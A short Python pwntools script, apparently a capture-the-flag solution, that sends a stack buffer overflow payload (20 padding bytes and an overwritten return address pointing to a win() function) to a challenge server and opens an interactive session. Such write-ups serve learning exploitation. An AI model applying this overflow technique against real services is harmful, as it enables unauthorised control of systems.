#!/usr/bin/env python
from pwn import *

host, port = "pwn.hsctf.com", 1234

#Connect to server
p = remote(host, port)

#Craft Payload
payload = "A"*20
payload += p32(0x080491b6) #Address of win()

p.recv()

#Send Payload
p.sendline(payload)
p.interactive()